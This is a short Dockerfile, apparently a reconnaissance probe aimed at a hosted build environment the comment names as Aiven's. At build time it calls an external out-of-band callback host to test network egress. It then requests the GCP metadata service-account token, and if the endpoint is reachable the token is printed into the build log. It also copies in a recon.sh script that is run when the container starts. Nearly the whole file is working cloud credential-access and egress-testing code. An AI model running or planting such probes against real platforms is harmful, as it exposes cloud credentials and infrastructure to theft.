FROM alpine:3.20
RUN apk add --no-cache curl
# BUILD-TIME probe: tests Aiven's BUILDER egress + metadata reachability
RUN echo "=== BUILD RECON ===" ; \
    curl -s -m5 "http://build.db89er9hl4lmff4bj6ug9mxhgt9oci3ws.oast.fun/b" -o /dev/null -w "build-oob=%{http_code}\n" || echo "build no-egress" ; \
    curl -s -m5 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" -w "\nbuild-gcp=%{http_code}\n" || echo "build-gcp blocked" ; \
    echo "=== BUILD RECON END ==="
COPY recon.sh /recon.sh
RUN chmod +x /recon.sh
CMD ["/recon.sh"]
